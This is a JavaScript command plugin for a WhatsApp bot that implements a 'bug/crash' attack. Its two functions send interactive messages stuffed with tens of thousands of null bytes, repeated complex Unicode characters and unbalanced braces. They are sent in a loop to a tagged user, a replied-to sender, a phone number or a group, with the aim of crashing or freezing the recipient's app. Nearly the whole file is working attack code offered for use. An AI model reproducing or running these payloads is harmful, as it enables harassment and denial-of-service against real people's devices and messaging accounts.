const { cmd } = require('../command');
const config = require('../config');
const os = require("os");
const { runtime } = require('../lib/functions');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// ---------------------- Helper ---------------------- //
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ====================== BUG FUNCTIONS (STABLE) ====================== //

async function RizzKenok(target, conn) {
    const bug_char = "జ్ఞ‌ා".repeat(10000);
    const crash_val = "\u0000".repeat(30000); 
    await conn.relayMessage(target, {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    header: { title: "🩸", hasMediaAttachment: false },
                    body: { text: "⌁⃰ *SYSTEM OVERLOAD* \n" + bug_char },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "payment_method", buttonParamsJson: crash_val },
                            { name: "single_select", buttonParamsJson: crash_val }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        forwardingScore: 999,
                        isForwarded: true
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}

async function InvisibleFC(target, conn) {
    let message = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "⚠️ CRASH SYSTEM ⚠️",
                        hasMediaAttachment: false,
                    },
                    body: { text: "System Lagging..." },
                    nativeFlowMessage: { messageParamsJson: "{".repeat(5000) },
                    contextInfo: { participant: target, mentionedJid: [target] },
                },
            },
        },
    };
    await conn.relayMessage(target, message, { participant: { jid: target } });
}

// ====================== COMMAND HANDLER ====================== //

cmd({
    pattern: "baga",
    alias: ["bug", "crash"],
    react: "🧬",
    desc: "Multi-JID supported Bug/Crash command.",
    category: "main",
    filename: __filename
},
async (robin, mek, m, { from, text, reply, sender }) => {
    try {
        let target = "";

        // 1. Tag (Mention) එකක් තිබේදැයි බැලීම
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            target = m.mentionedJid[0];
        } 
        // 2. Message එකකට Reply කර තිබේදැයි බැලීම
        else if (m.quoted) {
            target = m.quoted.sender || m.quoted.participant || m.quoted.key.remoteJid;
        } 
        // 3. කෙලින්ම JID එකක් හෝ අංකයක් Text එකේ තිබේදැයි බැලීම
        else if (text) {
            let input = text.trim();
            if (input.includes('@')) {
                target = input; // කෙලින්ම JID එකක් දුන්නොත් (e.g. lid, g.us)
            } else {
                target = input.replace(/[^0-9]/g, '') + "@s.whatsapp.net"; // අංකයක් පමණක් දුන්නොත්
            }
        }

        // Target එකක් හමු නොවුණහොත්
        if (!target || target === "") {
            return reply("❌ *Target එකක් හමු නොවීය!*\n\n*භාවිතය:*\n1. .baga @tag\n2. .baga (reply to message)\n3. .baga 123456@lid\n4. .baga 123456@g.us");
        }

        const uptimeStr = runtime(process.uptime());
        const statusText = `╭─〔 *☣️ BUG ATTACK ☣️*〕─◉
│
│🎯 *Target*: ${target}
│⏰ *Bot Uptime*: ${uptimeStr}
│⚡ *Status*: Sending Exploits...
╰─────────────────────────────⊷
> © 𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝐌𝗗 🌛`;

        await robin.sendMessage(from, { text: statusText }, { quoted: mek });

        // Bug Loops (බෝට් එක ආරක්ෂා කරගනිමින් යැවීම)
        for (let i = 0; i < 5; i++) {
            try {
                await InvisibleFC(target, robin);
                await sleep(2000);
                await RizzKenok(target, robin);
                console.log(`[BUG SENT] -> ${target} | Loop: ${i+1}`);
            } catch (err) {
                console.log("Internal Loop Error: ", err.message);
            }
        }

        await robin.sendMessage(from, { react: { text: "✅", key: mek.key } });
        reply(`✅ *Bug successfully sent to:* \n${target}`);

    } catch (e) {
        console.error("Baga Cmd Error:", e);
        reply(`⚠️ Bug Error: ${e.message}`);
    }
});
